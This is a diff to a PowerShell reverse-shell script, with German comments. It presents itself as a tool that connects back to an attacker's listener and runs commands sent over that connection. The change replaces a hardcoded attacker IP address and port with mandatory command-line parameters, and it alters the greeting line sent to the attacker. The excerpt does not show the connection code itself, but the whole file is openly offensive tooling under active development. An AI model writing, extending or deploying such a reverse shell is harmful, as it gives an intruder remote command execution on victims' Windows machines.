@@ -1,12 +1,20 @@
 # PowerShell-only Reverse Shell (keine cmd.exe, keine externen Tools)
 # Dieses Skript verbindet sich mit einem Listener und führt PowerShell-Befehle aus.
-# New
-# --- KONFIGURATION START ---
-$ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
-$port = 124           # <--- HIER IHREN LISTENER-PORT EINGEBEN!
+
+# --- KONFIGURATION START (Standardwerte können durch Parameter überschrieben werden) ---
+Param(
+    [Parameter(Mandatory=$true)]  # Macht die Angabe von -ip Pflicht
+    [string]$ip,                  # IP-Adresse des Angreifers/Listeners
+    
+    [Parameter(Mandatory=$true)]  # Macht die Angabe von -port Pflicht
+    [int]$port                    # Port des Listeners
+)
+# --- KONFIGURATION ENDE ---
+
+# --- INTERNE KONFIGURATION (nicht ändern, es sei denn, Sie wissen, was Sie tun) ---
 $logFile = "$env:TEMP\ps_revshell_log.txt" # Debugging-Log-Datei
 $sleepTimeMs = 50     # Wartezeit zwischen Befehlen in Millisekunden
-# --- KONFIGURATION ENDE ---
+# --- INTERNE KONFIGURATION ENDE ---
 
 # Hilfsfunktion zum Schreiben von Nachrichten in die Log-Datei
 function Write-Log ($message) {
@@ -31,7 +39,7 @@ try {
     Write-Log "Streams created."
 
     # Sende einen Willkommensgruß und das aktuelle Verzeichnis
-    $welcomeMessage = "You in L400.`n" + (Get-Location).Path + "> "
+    $welcomeMessage = "You in ;D`n" + (Get-Location).Path + "> "
     $sw.WriteLine($welcomeMessage);
     $sw.Flush();
     Write-Log "Welcome message sent."
